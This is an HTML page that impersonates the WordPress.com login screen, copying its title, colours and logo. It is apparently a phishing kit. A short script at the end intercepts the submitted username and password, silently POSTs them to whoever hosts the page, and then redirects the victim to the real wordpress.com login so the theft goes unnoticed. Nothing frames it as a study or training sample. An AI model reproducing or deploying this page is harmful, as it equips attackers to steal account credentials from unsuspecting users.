<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Log In ‹ WordPress.com</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;background:#f6f7f7}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:white;border:1px solid #dcdcde;padding:40px;width:400px}.logo{text-align:center;margin-bottom:30px}.logo svg{width:180px}.title{font-size:21px;font-weight:400;margin-bottom:24px}input{width:100%;padding:12px;border:1px solid #646970;border-radius:2px;font-size:16px;margin-bottom:16px;outline:none}input:focus{border-color:#0675c4;box-shadow:0 0 0 2px #0675c4}input[type="submit"]{background:#0675c4;color:white;border:none;font-size:16px;cursor:pointer}input[type="submit"]:hover{background:#055d9e}.link{text-align:center;margin-top:20px}.link a{color:#0675c4;text-decoration:none;font-size:14px}.link a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo"><svg viewBox="0 0 192 192"><circle cx="96"cy="96"r="96"fill="#0675c4"/><path d="M96 48L64 96l32 48 32-48-32-48z"fill="white"/></svg></div><div class="title">Log in to your account</div><form method="POST"><input type="text"name="username"placeholder="Email or Username"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log In"></form><div class="link"><a href="#">Forgot your password?</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://wordpress.com/log-in';});});</script></body></html>
